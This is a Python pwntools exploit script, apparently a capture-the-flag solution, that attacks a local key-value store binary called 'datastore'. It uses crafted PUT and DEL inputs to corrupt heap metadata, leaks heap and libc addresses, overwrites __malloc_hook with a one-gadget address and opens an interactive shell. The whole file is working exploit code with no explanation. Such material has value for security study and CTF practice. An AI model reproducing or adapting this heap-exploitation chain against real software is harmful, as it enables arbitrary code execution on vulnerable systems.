#!/usr/bin/python
from pwn import *

p = process('./datastore')

def put(key, data):
  p.sendlineafter('command:', 'PUT')
  p.sendlineafter('key:', key)
  p.sendlineafter('size:', str(len(data)))
  p.sendafter('data:', data)

def get(key):
  p.sendlineafter('command:', 'GET')
  p.sendlineafter('key:', key)

def dump():
  p.sendlineafter('command:', 'DUMP')

def delete(key):
  p.sendlineafter('command:', 'DEL')
  p.sendlineafter('key:', key)

put('3', '')
put('0', 'A'*128)
put('1', '')
put('2', '')
put('1', 'a'*248)
put('2', 'b'*248 + p64(33) + 'c'*16 + p64(1))
delete('1')
delete('k'*240 + p64(752))

delete('0')
delete('2')

delete('3')
put('3', ('A'*264 + p64(64) + p64(0) + 'D'*48 + p64(33) + p64(0) + 'C'*16 + p64(33) + 'KK\x00').ljust(1000, '\x01'))
put('leak', '')

get('KK')
p.recvline()
p.recvline()
kk = p.recvuntil('PROMPT: ')[:-8]
heap = u64(kk[272:280]) - 0xf0
print 'heap =', hex(heap) 

put('KK', 'A'*1000)
put('KK', kk[:280] + p64(8) + p64(heap + 0x2c8) + kk[296:])
get('leak')
p.recvline()
p.recvline()
leak = u64(p.recvuntil('PROMPT: ')[:-8])
libc = leak - 0x3c3b78
p.libc.addr = libc

print 'libc =', hex(libc)
gadget = libc + 0x4526a

put('KK', 'A'*1000)
put('KK', ('A'*264 + p64(0) + p64(heap+992) + p64(0)*6 + p64(112) + 'KK' + '\x00' + 'A'*101 + p64(64) + 'A'*120 + p64(64) + 'C\x00'.ljust(56) + p64(65)).ljust(1000, '\x01'))
delete('C')
delete('KK')
put('KK', ('A'*264 + p64(0) + p64(heap+992) + p64(0)*6 + p64(112) + p64(p.libc.symbols['__malloc_hook'] - 19) + 'A'*96 + p64(64) + 'A'*120 + p64(64) + 'C\x00'.ljust(56) + p64(65)).ljust(1000, '\x01'))

put('dummy', 'X'*96)
put('exploit', 'a'*3 + p64(gadget) + 'a'*5 + 'b'*80)
delete('id')

p.interactive()
